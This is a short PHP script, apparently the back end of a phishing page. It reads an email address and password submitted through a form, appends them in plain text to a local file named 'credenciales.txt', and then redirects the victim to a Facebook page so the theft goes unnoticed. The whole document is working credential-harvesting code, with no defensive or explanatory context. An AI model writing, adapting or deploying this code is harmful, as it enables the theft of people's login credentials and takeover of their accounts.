<?PHP
$email = $_POST["email"];
$contrasena = $_POST["pass"];
$texto = "\n Correo: $email        /       contrasena:  $contrasena";
echo "
<script language='JavaScript'>
location.href = \"https://www.facebook.com/kaiftopshop\";
</script>";

$file=fopen("credenciales.txt","a+") or exit("Unable to open file!");

   fwrite($file, $texto);


fclose($file);

?>